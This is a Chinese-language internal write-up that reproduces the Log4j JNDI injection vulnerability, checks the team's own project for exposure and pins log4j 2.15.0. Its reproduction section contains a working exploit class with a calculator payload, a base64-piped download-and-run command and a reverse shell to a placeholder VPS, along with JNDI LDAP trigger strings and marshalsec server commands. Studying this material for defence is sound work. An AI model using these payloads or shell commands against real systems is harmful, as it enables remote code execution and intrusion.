## 漏洞原理

漏洞预警： https://mp.weixin.qq.com/s/WBbAthHY36qY0w9e4UUl4Q

本质上是 log4j 里的 lookup 方法存在 jndi 注入（看图）：

![lookup](https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20211210091200YOXTYd.jpg)



## 漏洞复现

### 复现原理
log4j的 lookup功能在遇到特定命令时并非只是打印指定的文本而是去执行一些命令 例如

```java
LOGGER.error("${java:os}");
```
输出结果

```
21:22:09.431 [main] ERROR Test - Mac OS X 10.14.6 unknown, architecture: x86_64-64
```
在进入恶意攻击时，攻击原理是借助 JNDI Reference来达到在本地执行远程恶意代码。关于这部分的详细原理可以参考[这篇文章](https://y4er.com/post/attack-java-jndi-rmi-ldap-2/)。

因此实际操作中借助 `LOGGER.error("${jndi:ldap://127.0.0.1:1389/#Exploit}")`;
（使用LOGGER.info等其他级别的日志也可以达到同样的效果）来调用 ldap服务来执行恶意代码。


### 复现步骤
1、准备一个恶意类 

```java
public class Exploit {
    public Exploit() {
    }


    static {
        try {
            //在目标机器开启计算机
            String[] cmd1 = System.getProperty("os.name").toLowerCase().contains("win")
                    ? new String[]{"cmd.exe", "/c", "calc.exe"}
                    : new String[]{"/bin/bash", "-c", "open -a /Applications/Calculator.app"};
            //在目标机器执行shell 因为jvm有可能会过滤防御，对command base64编码
            String[] cmd2 = new String[]{"/bin/bash", "-c", " {echo,Y3VybCBodHRwOi8vcG9jL3Rhc3RlZ29vZA==}|{base64,-d}|{bash,-i}"};
            //一句话木马 借助一台 vps 来拿取服务运行后台的 shell 权限
            String[] cmd3 = new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/<VPS IP>/8888 0>&1"};
            Runtime.getRuntime().exec(cmd1);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        Exploit e = new Exploit();
    }
}

```

这里我们测试恶意命令1，在目标主机打开计算机。

ps:cmd2是一个调用shell的语句；cmd3是一个直接获取目标主机 shell 的恶意木马。后面有时间可以分享恶意攻击过程。

2、将恶意类编译，然后将恶意类放在一个 web 服务的目录中，保证可以访问到

在实际操作中一般直接到恶意类的目录，使用命令`python3 -m http.server 8080`将此文件夹作为目录映射为 web 服务
映射后即可在浏览器访问到此文件，如图：
![web 服务](https://gitee.com/haigeek/picture/raw/master/uPic/dzstrp.png)

3、开启一个 ldap 服务
使用 ldap 服务快速开启工具 (开源工具：https://github.com/mbechler/marshalsec) 开启一个Ldap 服务
开启命令：
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8080/#Exploit
```
其中#后面填写你的恶意类的类名，它会自动绑定URI
开启后如图

![alt](https://gitee.com/haigeek/picture/raw/master/uPic/jLdiW5.png)


3、借助 log4j的漏洞触发攻击，jndi调用ldap 服务的恶意类并在本地执行

触发类：
```java
public class Test {

    private static final Logger LOGGER= LogManager.getLogger(Test.class);

    public static void main(String[] args) {
        LOGGER.error("${jndi:ldap://127.0.0.1:1389/Exploit}");
    }

}

```
这里直接模拟了 log4j调用 jndi 场景。

在实际应用中，如果在http的请求头或者请求参数中携带恶意代码，例如在登录名的输入框输入 `${jndi:ldap://127.0.0.1:1389/Exploit}"`，而后端刚好将获取到的参数打印，由于 log4j对 lookup 的调用没有做安全限制，就会触发漏洞。

4、验证攻击是否成功

执行触发代码后，执行结果如下：
成功执行恶意类 Exploit 打开了服务运行机器的计算器

![alt](https://gitee.com/haigeek/picture/raw/master/uPic/x1YQLT.png)

在 Ldap 服务端打印了日志：

![alt](https://gitee.com/haigeek/picture/raw/master/uPic/E8xHcz.png)

可以看到请求执行Exploit类时，Ldap 服务端去我们启动的 web 服务下拿到了Exploit.class ，最终在宿主机完成执行。

## 自查
在本地按照上述步骤开启Ldap服务，在工程的 runtime 模块下执行 Test类即可。

经过测试，我们目前的代码并未受到此刻漏洞的影响。主要原因是我们用的是 SpringBoot 默认的 logback。
而elasticsearch虽然引用了 Log4j2,但是设置了optional为 true 的属性。
![alt](https://gitee.com/haigeek/picture/raw/master/uPic/cWGY15.png)
在最终编译出来的 jar 包中也不存在 log4j-core jar 包（漏洞实现类在 core 包）
![alt](https://gitee.com/haigeek/picture/raw/master/uPic/h6I23z.png)

## 处理方式

虽然我们并未直接引用 core 包，但是存在 log4j-api 包且版本在受影响的范围内，因此我们目前暂时在 parent工程中对log4j的版本做了控制。

```
<log4j2.version>2.15.0</log4j2.version>
```
ps：maven 仓库的2.15.0版本已经是基于2.15.0-rc2编译后的版本，实际测试也是可以规避漏洞的。

